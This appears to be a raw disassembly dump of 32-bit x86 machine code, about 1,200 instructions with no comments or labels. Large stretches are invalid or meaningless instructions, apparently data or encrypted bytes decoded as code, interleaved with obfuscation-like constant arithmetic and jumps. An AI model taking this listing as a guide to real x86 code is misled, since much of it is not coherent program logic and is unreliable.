  41094c:	add    esi,DWORD PTR [esi+0x30c795ae]
  410952:	xor    eax,0x62d3783d
  410957:	repnz pop edx
  410959:	pop    ss
  41095a:	sar    BYTE PTR ds:0x8f07ced,0x5a
  410961:	in     eax,0xbc
  410963:	mov    cl,0x77
  410965:	and    ecx,edi
  410967:	ficom  DWORD PTR [eax-0x74082b9f]
  41096d:	and    eax,0xc5eb4a67
  410972:	dec    esp
  410973:	or     al,0xb7
  410975:	adc    esp,DWORD PTR [esp+esi*2+0x56]
  410979:	mov    bl,0x84
  41097b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41097c:	jg     0x4109a4
  41097e:	outs   dx,DWORD PTR ds:[esi]
  41097f:	push   ebx
  410980:	mov    DWORD PTR [ebx],eax
  410982:	mov    eax,0x8a4b68ae
  410987:	call   0x866ae943
  41098c:	mov    ch,0xe5
  41098e:	sar    BYTE PTR [esp+ebp*1],cl
  410991:	jmp    0xb8c7:0x389a8bee
  410998:	fsub   st,st(2)
  41099a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41099b:	add    esi,DWORD PTR [edx]
  41099d:	sbb    al,0xb1
  41099f:	jb     0x41098a
  4109a1:	or     bh,ch
  4109a3:	(bad)  
  4109a4:	dec    esi
  4109a5:	xchg   edx,eax
  4109a6:	cmp    esp,edi
  4109a8:	mov    edi,0xeb98819a
  4109ad:	test   BYTE PTR [edi],dh
  4109af:	ror    BYTE PTR ss:[eax+0x36fa43eb],1
  4109b6:	or     dh,BYTE PTR [esp+ecx*8]
  4109b9:	mov    eax,0x58c40df9
  4109be:	add    BYTE PTR [eax],al
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x4220c5
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x4220c5
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0x6a06a58b
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [esi-0x35d72ad5],dh
  410a81:	xchg   ecx,eax
  410a82:	js     0x410a9a
  410a84:	and    DWORD PTR [ebx-0x273ac179],0x57
  410a8b:	push   edx
  410a8c:	aaa    
  410a8d:	push   ss
  410a8e:	pop    edx
  410a8f:	xchg   ecx,eax
  410a90:	fdivr  DWORD PTR [ebp+0x4b2c3fc1]
  410a96:	aas    
  410a97:	inc    edi
  410a98:	mov    bl,0x25
  410a9a:	cwde   
  410a9b:	cmp    BYTE PTR [esi+0x4a],bl
  410a9e:	cmp    esp,DWORD PTR [ebp+0x3d]
  410aa1:	xchg   edx,eax
  410aa2:	or     ch,ch
  410aa4:	and    DWORD PTR ss:[si-0x3c],ebx
  410aa9:	gs test eax,0x18cf45a
  410aaf:	pop    ebp
  410ab0:	(bad)  
  410ab1:	sti    
  410ab2:	fs mov esi,0x9a86ed06
  410ab8:	dec    esi
  410ab9:	iret   
  410aba:	mov    esp,0xa359e34d
  410abf:	or     eax,0x89b82cd2
  410ac4:	sbb    al,0xf1
  410ac6:	int3   
  410ac7:	rcl    BYTE PTR [eax+0x2e27d097],0xc
  410ace:	fs cmp eax,0x836694b7
  410ad4:	int3   
  410ad5:	sahf   
  410ad6:	fwait
  410ad7:	cmp    edx,edi
  410ad9:	jle    0x410b07
  410adb:	jbe    0x410a7d
  410add:	mov    al,ds:0x311647c8
  410ae2:	sub    ebp,esi
  410ae4:	dec    edi
  410ae5:	xchg   edi,eax
  410ae6:	in     al,0x1b
  410ae8:	bound  ebx,QWORD PTR [esi]
  410aea:	mov    ebp,0xd2353041
  410aef:	sub    bl,BYTE PTR [edx]
  410af1:	dec    BYTE PTR [eax]
  410af3:	sbb    eax,0xc4c8cd7d
  410af8:	fstp   TBYTE PTR [eax-0x6fa5c36c]
  410afe:	imul   esi,ecx,0x2b5b4e79
  410b04:	mov    eax,0xb84122e
  410b09:	push   ds
  410b0a:	in     al,0x53
  410b0c:	inc    edx
  410b0d:	mov    edi,DWORD PTR [ebx]
  410b0f:	std    
  410b10:	fmul   DWORD PTR [ecx+0x54d7c130]
  410b16:	adc    cl,dl
  410b18:	pop    ss
  410b19:	je     0x410aae
  410b1b:	rcl    BYTE PTR [esi+0x342a40a0],0x1a
  410b22:	inc    edx
  410b23:	sub    al,0xd
  410b25:	mov    ch,0x6b
  410b27:	inc    ecx
  410b28:	nop
  410b29:	cmp    al,0xac
  410b2b:	cmp    cl,ah
  410b2d:	mov    bh,0x36
  410b2f:	pop    edx
  410b30:	mov    ch,al
  410b32:	fld    TBYTE PTR [esi]
  410b34:	push   ebx
  410b35:	add    ecx,DWORD PTR [esi-0x41]
  410b38:	mov    al,ds:0x94fb0db9
  410b3d:	mov    esp,0x556db9f7
  410b42:	xchg   esi,eax
  410b43:	aaa    
  410b44:	dec    eax
  410b45:	mov    WORD PTR [edi+0x2af969e4],fs
  410b4b:	test   al,0x36
  410b4d:	jns    0x410ae4
  410b4f:	add    al,0x46
  410b51:	retf   
  410b52:	aam    0xd4
  410b54:	fucom  st(6)
  410b56:	in     eax,0x70
  410b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b59:	push   cs
  410b5a:	inc    edx
  410b5b:	dec    edi
  410b5c:	outs   dx,DWORD PTR ds:[esi]
  410b5d:	xbegin 0x4bc4bd96
  410b63:	pop    edi
  410b64:	mov    edx,0xa6e4d527
  410b69:	or     esi,esi
  410b6b:	fidivr WORD PTR [esi]
  410b6d:	ins    DWORD PTR es:[edi],dx
  410b6e:	push   esi
  410b6f:	dec    edi
  410b70:	push   esp
  410b71:	jge    0x410b28
  410b73:	jae    0x410bdc
  410b75:	lahf   
  410b76:	inc    esp
  410b77:	inc    edx
  410b78:	push   ecx
  410b79:	adc    edx,DWORD PTR [ecx]
  410b7b:	mov    al,ds:0xe06d3dc8
  410b80:	mov    esi,0xb89b9ba1
  410b85:	dec    esi
  410b86:	jmp    FWORD PTR [ecx-0x665dfedb]
  410b8c:	test   al,0xca
  410b8e:	jl     0x410c0c
  410b90:	in     al,0xb4
  410b92:	mov    ds:0xf2c3cd9b,eax
  410b97:	dec    ecx
  410b98:	add    al,0xdc
  410b9a:	or     DWORD PTR [edi-0x2c41cd5f],ebp
  410ba0:	retf   0x3181
  410ba3:	mov    DWORD PTR [eax],edx
  410ba5:	rol    DWORD PTR [edi+0x18],1
  410ba8:	lock aam 0x60
  410bab:	mov    ebp,0x3d95c6e9
  410bb0:	hlt    
  410bb1:	jnp    0x410b90
  410bb3:	sbb    al,0x8e
  410bb6:	cdq    
  410bb7:	stos   BYTE PTR es:[edi],al
  410bb8:	xchg   ecx,eax
  410bb9:	xchg   edx,eax
  410bba:	add    al,0xc0
  410bbc:	data16 mov bh,0xf9
  410bbf:	shl    eax,0x80
  410bc2:	sbb    al,0x75
  410bc5:	mov    esi,0x23ecfbf0
  410bca:	xor    ch,BYTE PTR [eax-0x6d]
  410bcd:	mov    ah,0x4b
  410bcf:	test   ecx,edi
  410bd1:	mov    edi,0xbf22667f
  410bd6:	mov    WORD PTR es:0xb64f2eee,ss
  410bdd:	xchg   ebx,eax
  410bde:	xlat   BYTE PTR ds:[ebx]
  410bdf:	sbb    eax,0x6f754063
  410be4:	les    ecx,FWORD PTR [ebx+0x23]
  410be7:	jbe    0x410c43
  410be9:	inc    eax
  410bea:	adc    DWORD PTR [eax+ecx*1+0x7ed36924],0xffffffc5
  410bf2:	(bad)  
  410bf3:	fcomp  st(2)
  410bf5:	and    ecx,edi
  410bf7:	and    BYTE PTR [ecx-0x262c153a],ch
  410bfd:	pushf  
  410bfe:	push   esi
  410bff:	scas   al,BYTE PTR es:[edi]
  410c00:	out    dx,eax
  410c01:	stos   DWORD PTR es:[edi],eax
  410c02:	fstp   DWORD PTR [ecx-0x7b]
  410c05:	pop    eax
  410c06:	mov    bh,0xcb
  410c08:	mov    ds:0x211a43c0,eax
  410c0d:	nop
  410c0e:	jp     0x410bb0
  410c10:	outs   dx,BYTE PTR ds:[esi]
  410c11:	cdq    
  410c12:	test   DWORD PTR [ebx+0x7c3c70b1],ecx
  410c18:	retf   
  410c19:	fild   WORD PTR [esi+0x6d6fe257]
  410c1f:	xchg   DWORD PTR [esp+edi*8],edi
  410c22:	lds    ecx,FWORD PTR [ebx-0x4ec39087]
  410c28:	shl    ebx,0x39
  410c2b:	cmp    BYTE PTR [edx],ah
  410c2d:	mov    ch,0x5e
  410c2f:	shr    DWORD PTR [ebp-0x2e],0xbd
  410c33:	mov    dl,0x46
  410c35:	sar    bh,1
  410c37:	pop    ecx
  410c38:	xor    ecx,DWORD PTR [eax]
  410c3a:	(bad)  
  410c3b:	scas   eax,DWORD PTR es:[edi]
  410c3c:	(bad)  
  410c3d:	out    0x40,eax
  410c3f:	cs into 
  410c41:	ret    0xa027
  410c44:	std    
  410c45:	mov    eax,0xfc7a5ffd
  410c4a:	call   0x4ad0:0xb4efdc7c
  410c51:	call   0x44aeec46
  410c56:	clc    
  410c57:	xor    DWORD PTR ds:0x10e88339,esp
  410c5d:	adc    BYTE PTR [ebp-0x1bd491e9],dh
  410c63:	jb     0x410c24
  410c65:	lods   eax,DWORD PTR ds:[esi]
  410c66:	and    dh,bh
  410c68:	je     0x410c94
  410c6a:	push   eax
  410c6b:	push   ds
  410c6c:	call   0x8610f8c5
  410c71:	ins    BYTE PTR es:[edi],dx
  410c72:	adc    DWORD PTR [ecx+0x839cd22],ebp
  410c78:	cmp    bl,al
  410c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c7b:	dec    ecx
  410c7c:	fdiv   QWORD PTR [eax+0x56]
  410c7f:	les    esi,FWORD PTR [eax+0x758939db]
  410c85:	or     al,0x5b
  410c87:	push   eax
  410c88:	into   
  410c89:	in     eax,0x8c
  410c8b:	sub    ah,BYTE PTR [esp+edi*4-0x2e87688d]
  410c92:	mov    WORD PTR [ecx],ss
  410c94:	sub    al,0x49
  410c96:	adc    DWORD PTR [edx],ebx
  410c98:	xchg   esp,eax
  410c99:	xchg   ecx,eax
  410c9a:	fwait
  410c9b:	shr    BYTE PTR [edi+0x57],0xd9
  410c9f:	ret    
  410ca0:	add    dl,dl
  410ca2:	jo     0x410ca0
  410ca4:	daa    
  410ca5:	xor    al,0xe0
  410ca7:	mov    ch,0x45
  410ca9:	fsubr  QWORD PTR [ebx+0x49b0be9]
  410caf:	call   DWORD PTR [eax-0x8]
  410cb2:	dec    esi
  410cb3:	ret    0x6fd2
  410cb6:	xchg   esp,eax
  410cb7:	test   BYTE PTR [eax+ecx*4+0x62c159c8],dl
  410cbe:	xor    al,0x87
  410cc0:	dec    eax
  410cc1:	xchg   edi,eax
  410cc2:	fmulp  st(4),st
  410cc4:	arpl   WORD PTR [ecx],bp
  410cc6:	jge    0x410d0c
  410cc8:	stos   DWORD PTR es:[edi],eax
  410cc9:	and    al,0x8f
  410ccb:	aaa    
  410ccc:	pushf  
  410ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cce:	dec    eax
  410ccf:	cs ds ins DWORD PTR es:[edi],dx
  410cd2:	(bad)  
  410cd4:	mov    bh,0xc1
  410cd6:	sti    
  410cd7:	sub    eax,0x80758b7
  410cdc:	cmp    BYTE PTR [ebx+edi*8],dl
  410cdf:	popf   
  410ce0:	aas    
  410ce1:	xchg   ebx,eax
  410ce2:	aaa    
  410ce3:	pop    edx
  410ce4:	inc    ecx
  410ce5:	nop
  410ce6:	test   dh,dh
  410ce8:	add    ebx,DWORD PTR [ebp+0x23]
  410ceb:	pop    ebx
  410cec:	test   BYTE PTR [edx+edi*2+0x3881a936],al
  410cf3:	push   ebx
  410cf4:	stos   DWORD PTR es:[edi],eax
  410cf5:	retfw  
  410cf7:	inc    esi
  410cf8:	sahf   
  410cf9:	add    al,0xcb
  410cfb:	dec    esi
  410cfc:	mov    DWORD PTR [eax-0x6e],0xb20c47e4
  410d03:	mov    al,0xef
  410d05:	call   DWORD PTR ds:0x1161b2a6
  410d0b:	loop   0x410d36
  410d0d:	push   esp
  410d0e:	in     eax,dx
  410d0f:	pop    ebx
  410d10:	popa   
  410d11:	shr    BYTE PTR [edi+ecx*8-0x2e07700b],cl
  410d18:	add    ebx,DWORD PTR [ebx+0x7d]
  410d1b:	leave  
  410d1c:	das    
  410d1d:	addr16 repz jae 0x410d78
  410d21:	ret    
  410d22:	cs aam 0xce
  410d25:	adc    eax,0x12b53118
  410d2a:	pop    ds
  410d2b:	adc    eax,0x3818f29a
  410d30:	int    0x72
  410d32:	and    edx,DWORD PTR ds:0xefb6d80d
  410d38:	cmp    eax,0x547ca4a9
  410d3d:	cli    
  410d3e:	mov    dl,0x89
  410d40:	jge    0x410d3e
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffffd2
  410d65:	add    DWORD PTR [edx+ebp*2],0x1818826d
  410d6c:	call   0xbbc0:0xd7181814
  410d73:	sub    BYTE PTR [ecx+ebp*1+0x1f],al
  410d77:	add    al,0x39
  410d79:	cmp    ecx,DWORD PTR [edx]
  410d7b:	es jo  0x410d65
  410d7e:	fwait
  410d7f:	mov    al,ds:0xca245449
  410d84:	xchg   edx,eax
  410d85:	sub    eax,0x7184d271
  410d8a:	inc    eax
  410d8b:	shl    DWORD PTR [ecx],cl
  410d8d:	pop    esp
  410d8e:	pop    edx
  410d8f:	lea    eax,[edx-0x5f]
  410d92:	fnstsw WORD PTR [eax+eax*8-0x5b]
  410d96:	repnz les edi,FWORD PTR [esi]
  410d99:	cdq    
  410d9a:	(bad)  
  410d9b:	pop    ds
  410d9c:	pop    esi
  410d9d:	pop    ebx
  410d9e:	out    dx,eax
  410d9f:	push   edi
  410da0:	jl     0x410da1
  410da2:	test   al,0x35
  410da4:	sbb    eax,0xa79d7f3b
  410da9:	jge    0x410dac
  410dab:	add    eax,DWORD PTR [esi-0x46]
  410dae:	mov    dh,0xa5
  410db0:	(bad)  
  410db1:	(bad)  
  410db2:	pop    esi
  410db3:	test   eax,0xe5322257
  410db8:	sar    BYTE PTR [ecx+0x63],0x5d
  410dbc:	in     al,dx
  410dbd:	xchg   ebx,eax
  410dbe:	xchg   edx,eax
  410dbf:	adc    BYTE PTR [esi],dh
  410dc1:	cld    
  410dc2:	mov    BYTE PTR [ebx-0x4c460008],0xcb
  410dc9:	sar    DWORD PTR [ecx-0x5996254d],1
  410dcf:	and    al,0x36
  410dd1:	xchg   esp,eax
  410dd2:	mov    WORD PTR [esi+0x3dabe0ad],ss
  410dd8:	mov    ds:0x2319c873,eax
  410ddd:	push   ss
  410dde:	push   edi
  410ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410de0:	in     al,0xc
  410de2:	sub    BYTE PTR [eax+ecx*2+0x79d1728b],cl
  410de9:	aaa    
  410dea:	xchg   DWORD PTR [edx+0x1600be46],ecx
  410df0:	ins    DWORD PTR es:[edi],dx
  410df1:	ins    DWORD PTR es:[edi],dx
  410df2:	adc    DWORD PTR [ecx-0xc5c905],ebx
  410df8:	xchg   DWORD PTR [ecx+0x1ca6f7ea],edx
  410dfe:	imul   ebp,ebp,0x19f6b011
  410e04:	inc    eax
  410e05:	adc    al,0x46
  410e07:	out    0x3a,al
  410e09:	xchg   ebx,eax
  410e0a:	stos   BYTE PTR es:[edi],al
  410e0b:	pop    ecx
  410e0c:	mov    al,0x1
  410e0e:	cmp    DWORD PTR [ebx+edx*2],esp
  410e11:	hlt    
  410e12:	call   0x50ae:0xedd69a0c
  410e19:	loopne 0x410e95
  410e1b:	in     eax,dx
  410e1c:	jp     0x410e6b
  410e1e:	push   esi
  410e1f:	adc    eax,DWORD PTR [ebx-0x7e8758db]
  410e25:	xor    al,0x6a
  410e28:	comiss xmm0,DWORD PTR [edi+ebx*2]
  410e2c:	sbb    esi,esp
  410e2e:	adc    ebx,DWORD PTR [esi-0x3184a646]
  410e34:	push   cs
  410e35:	pop    ebx
  410e36:	das    
  410e37:	push   edi
  410e38:	pushf  
  410e39:	lds    ecx,FWORD PTR [ecx]
  410e3b:	sbb    eax,0x7763d664
  410e40:	inc    ebp
  410e41:	fldenv [eax]
  410e43:	sbb    DWORD PTR [esp+ebp*4+0x1bd5e7bc],eax
  410e4a:	test   eax,0x3738409b
  410e4f:	daa    
  410e50:	cmp    al,0x53
  410e52:	rcl    BYTE PTR [edi-0x6c],cl
  410e55:	dec    esp
  410e56:	sti    
  410e57:	imul   ebp,DWORD PTR [edx+0x3b],0x2e94088e
  410e5e:	hlt    
  410e5f:	inc    esp
  410e60:	mov    cl,0x6d
  410e62:	push   eax
  410e63:	or     dh,BYTE PTR [ebp-0x4428ec43]
  410e69:	add    al,0x9b
  410e6b:	mov    bh,0x76
  410e6d:	icebp  
  410e6e:	cmp    esi,DWORD PTR [eax-0x7b]
  410e71:	mov    ch,0xa8
  410e73:	mov    fs,esp
  410e75:	cmp    ebp,DWORD PTR [eax-0x5cb6a8b0]
  410e7b:	adc    ebx,DWORD PTR [edi]
  410e7d:	out    dx,eax
  410e7e:	pop    eax
  410e7f:	xor    al,0xb9
  410e81:	icebp  
  410e82:	push   ebx
  410e83:	adc    edx,DWORD PTR [ebx+edx*8-0x1b887564]
  410e8a:	xlat   BYTE PTR ds:[ebx]
  410e8b:	mov    eax,0xd8b1cf9e
  410e90:	popf   
  410e91:	or     eax,DWORD PTR [esi+edx*4+0x56]
  410e95:	add    eax,0xea03161e
  410e9a:	inc    ebx
  410e9b:	and    eax,0x441214ec
  410ea0:	loop   0x410e43
  410ea2:	scas   al,BYTE PTR es:[edi]
  410ea3:	inc    edx
  410ea4:	jo     0x410ea5
  410ea6:	and    dh,cl
  410ea8:	pop    ebp
  410ea9:	cmp    eax,0xcab0d236
  410eae:	test   al,0xb6
  410eb0:	jmp    0x410f26
  410eb2:	aas    
  410eb3:	rcr    DWORD PTR [edi-0x72],1
  410eb6:	push   ds
  410eb7:	inc    ebp
  410eb8:	mov    cl,0x3d
  410eba:	cs scas eax,DWORD PTR es:[edi]
  410ebc:	push   edx
  410ebd:	pop    ss
  410ebe:	mov    esp,0x165c19e5
  410ec3:	clc    
  410ec4:	iret   
  410ec5:	cmp    ecx,DWORD PTR [edi-0x43]
  410ec8:	xchg   ebp,eax
  410ec9:	xlat   BYTE PTR ds:[ebx]
  410eca:	pop    es
  410ecb:	or     esi,edi
  410ecd:	bnd call 0x23a4a584
  410ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ed4:	push   esi
  410ed5:	(bad)  
  410ed7:	(bad)  
  410ed8:	mov    ds:0x91691e02,al
  410edd:	pop    ebx
  410ede:	mov    edx,0x60f3315f
  410ee3:	das    
  410ee4:	nop
  410ee5:	xchg   ecx,eax
  410ee6:	ds xor ah,bh
  410ee9:	pop    eax
  410eea:	pushf  
  410eeb:	mov    ch,0x50
  410eed:	je     0x410f46
  410eef:	sbb    DWORD PTR [edi],esp
  410ef1:	(bad)  
  410ef2:	popa   
  410ef3:	mov    edx,0x873275b1
  410ef8:	jge    0x410f08
  410efa:	out    0x15,al
  410efc:	sbb    ebx,DWORD PTR [esi+0x27]
  410eff:	push   ebp
  410f00:	test   DWORD PTR [ebp-0x28],ecx
  410f03:	std    
  410f04:	ds das 
  410f06:	jmp    0x8c059b72
  410f0b:	mov    bh,0x8d
  410f0d:	inc    esp
  410f0e:	pop    edi
  410f0f:	add    BYTE PTR [ecx+0x9],al
  410f12:	cwde   
  410f13:	bound  esp,QWORD PTR [edx+0x4372a61c]
  410f19:	inc    ecx
  410f1a:	or     ebp,DWORD PTR [eax-0x2e]
  410f1d:	adc    eax,0x1805409
  410f22:	mov    al,ds:0xe240a06
  410f27:	les    ebx,FWORD PTR [edx-0x15]
  410f2a:	sbb    eax,0xc051b375
  410f2f:	sub    al,0x83
  410f31:	add    eax,DWORD PTR [esp+eiz*2]
  410f34:	mov    BYTE PTR [esi],bh
  410f36:	adc    bh,BYTE PTR [edi+0x2]
  410f39:	sub    eax,0x2259012f
  410f3e:	and    al,0xf3
  410f40:	jmp    0xcd4d25ad
  410f45:	iret   
  410f46:	lock adc al,0xfd
  410f49:	jmp    0x8dc9:0x9f5e86e3
  410f50:	mov    dl,bh
  410f52:	mov    bl,0xe5
  410f54:	sub    al,0x15
  410f56:	int    0x37
  410f58:	xchg   ebp,eax
  410f59:	inc    esi
  410f5a:	mov    dh,0x80
  410f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f5d:	out    0x4a,eax
  410f5f:	dec    edx
  410f60:	sub    bl,0xb4
  410f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f64:	mov    esp,0x3e50bd6
  410f69:	scas   eax,DWORD PTR es:[edi]
  410f6a:	or     ecx,DWORD PTR [esi-0x1f6b9b20]
  410f70:	loopne 0x410fc6
  410f72:	imul   BYTE PTR [eax]
  410f74:	repz (bad) 
  410f76:	(bad)  
  410f78:	stos   BYTE PTR es:[edi],al
  410f79:	jne    0x410fc2
  410f7b:	shl    DWORD PTR [edx-0x6adad144],cl
  410f81:	jl     0x410fa0
  410f83:	jle    0x410fe3
  410f85:	or     edi,DWORD PTR [ecx-0x5e]
  410f88:	outs   dx,BYTE PTR ds:[esi]
  410f89:	pop    esi
  410f8a:	sbb    eax,0xd2a2e424
  410f8f:	inc    ebp
  410f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f91:	(bad)  [eax+0x30]
  410f94:	mov    al,ds:0xe1e1891f
  410f99:	rol    edx,1
  410f9b:	adc    BYTE PTR [ecx+0x3edfa4f],bl
  410fa1:	das    
  410fa2:	leave  
  410fa3:	xor    bl,BYTE PTR [ebp-0x5a4a9455]
  410fa9:	push   esi
  410faa:	or     edx,0x30
  410fad:	sbb    ecx,DWORD PTR [eax+0x288d25c7]
  410fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fb4:	mov    esi,0x64d8a291
  410fb9:	inc    eax
  410fba:	add    edx,esp
  410fbc:	fld    TBYTE PTR [eax-0x72]
  410fbf:	rol    BYTE PTR [eax],cl
  410fc1:	xchg   BYTE PTR ds:0xebb03b76,al
  410fc7:	pop    es
  410fc8:	xor    eax,0x1e92c6cd
  410fcd:	retf   
  410fce:	mov    al,ds:0x5b9910ba
  410fd3:	icebp  
  410fd4:	pop    edi
  410fd5:	mov    eax,ds:0x156c0603
  410fda:	mov    bl,0x81
  410fdc:	leave  
  410fdd:	sub    eax,esi
  410fdf:	lea    esi,[esi]
  410fe1:	adc    ch,BYTE PTR [ebp-0x49024c10]
  410fe7:	cmc    
  410fe8:	adc    eax,0xb0f13cad
  410fed:	push   0xf8e05372
  410ff2:	pusha  
  410ff3:	xchg   edx,eax
  410ff4:	pop    ebx
  410ff5:	int    0xe8
  410ff7:	ss icebp 
  410ff9:	call   DWORD PTR [ebx-0xe]
  410ffc:	dec    ebx
  410ffd:	test   BYTE PTR es:[edx+eiz*1-0x1764821f],ah
  411005:	retf   0xc561
  411008:	mov    esi,0x324ed927
  41100d:	popf   
  41100e:	dec    esi
  41100f:	std    
  411010:	(bad)  [ebx+0xd]
  411013:	ja     0x411045
  411015:	sbb    dl,BYTE PTR [edi-0x6f16a997]
  41101b:	dec    edi
  41101c:	popa   
  41101d:	fiadd  WORD PTR [edx+esi*4+0x6a]
  411021:	push   edi
  411022:	sub    al,0x5a
  411024:	cs jns 0x410ff0
  411027:	and    cl,cl
  411029:	das    
  41102a:	lods   al,BYTE PTR ds:[esi]
  41102b:	mov    ds:0xb787411c,al
  411030:	shl    BYTE PTR [edx+0x7c],0x8b
  411034:	dec    ebp
  411035:	cld    
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
